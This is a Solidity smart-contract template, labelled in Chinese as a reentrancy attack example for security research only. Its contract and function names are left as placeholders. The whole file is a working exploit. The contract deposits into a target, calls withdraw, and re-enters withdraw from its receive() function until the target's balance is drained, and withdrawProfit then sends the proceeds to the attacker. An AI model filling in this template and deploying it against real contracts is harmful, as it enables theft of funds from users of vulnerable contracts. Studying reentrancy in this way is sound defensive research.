// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title $ATTACK_CONTRACT_NAME
/// @notice 针对 $TARGET_CONTRACT_NAME 的重入攻击示例，仅用于安全研究
interface IReentrancyTarget {
    function $TARGET_DEPOSIT_FUNCTION() external payable;

    function $TARGET_WITHDRAW_FUNCTION(uint256 amount) external;
}

contract $ATTACK_CONTRACT_NAME {
    IReentrancyTarget public target;
    address public attacker;
    bool private attacking;

    constructor(address _target) {
        target = IReentrancyTarget(_target);
        attacker = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == attacker, "only attacker");
        require(msg.value > 0, "need ether");

        target.$TARGET_DEPOSIT_FUNCTION{value: msg.value}();
        attacking = true;
        target.$TARGET_WITHDRAW_FUNCTION(msg.value);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(target).balance > 0) {
            target.$TARGET_WITHDRAW_FUNCTION(msg.value);
        }
    }

    function withdrawProfit() external {
        require(msg.sender == attacker, "only attacker");
        payable(attacker).transfer(address(this).balance);
    }
}

